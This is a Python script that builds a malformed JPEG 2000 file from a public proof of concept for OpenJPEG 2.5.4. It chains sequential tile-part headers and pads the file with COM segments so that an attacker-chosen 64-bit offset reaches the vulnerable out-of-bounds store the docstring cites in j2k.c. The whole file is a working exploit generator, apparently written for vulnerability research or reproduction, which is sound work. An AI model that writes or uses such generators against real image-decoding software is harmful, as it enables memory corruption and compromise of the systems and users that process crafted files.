#!/usr/bin/env python3
"""Build a sequential-tile-part variant of the pinned public PoC.

OpenJPEG 2.5.4 j2k.c:4494 requires SOT TPsot to equal
m_current_tile_part_number + 1, so a large TPsot is only reachable after that
many valid tile parts. This script emits `evil` sequential tile-parts (0..evil)
from the committed 202-byte PoC, with the last one carrying the chosen TPsot.
COM padding before the SOTs moves its SOD offset, which is the 64-bit value
the vulnerable j2k.c:5086/5088 stores write.

Usage: make-large-tpsot.py SRC.j2k OUT.j2k TARGET_OFFSET TPSOT
TARGET_OFFSET must be >= the minimal SOD position (printed on failure).
"""
import sys

src, dst, target, evil = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
orig = bytearray(open(src, 'rb').read())
hdr = bytes(orig[:0x76])              # SOC..TLM, before the first SOT
first = bytes(orig[0x76:0x91])        # tile part 0 (SOT + SOD + data)
tail = bytes(orig[0xad:])             # tile 1 and EOC
assert first[:2] == b'\xff\x90' and tail[:2] == b'\xff\x90'
assert evil >= 1

# SOD position of the malicious tile part with no COM padding.
base = len(hdr) + len(first) + (evil - 1) * 14 + 12
pad_len = target - base
if pad_len < 0:
    sys.exit('TARGET_OFFSET %d below minimum %d (evil=%d)' % (target, base, evil))

segs, left = [], pad_len
while left > 0:
    n = min(left - 6, 65531)          # COM: marker(2)+Lcom(2)+Rcom(2)+payload
    segs.append(b'\xff\x64' + (4 + n).to_bytes(2, 'big') + b'\x00\x00' + b'A' * n)
    left -= 6 + n
pad = b''.join(segs)
assert len(pad) == pad_len

def sot(i):
    return (b'\xff\x90\x00\x0a\x00\x00' + (14).to_bytes(4, 'big')
            + bytes([i, 0]) + b'\xff\x93')

out = hdr + pad + first + b''.join(sot(i) for i in range(1, evil + 1)) + tail
open(dst, 'wb').write(out)
print('P=%d T=%#x evil=%d len=%d predicted_sod=%d'
      % (pad_len, target, evil, len(out), base + pad_len))
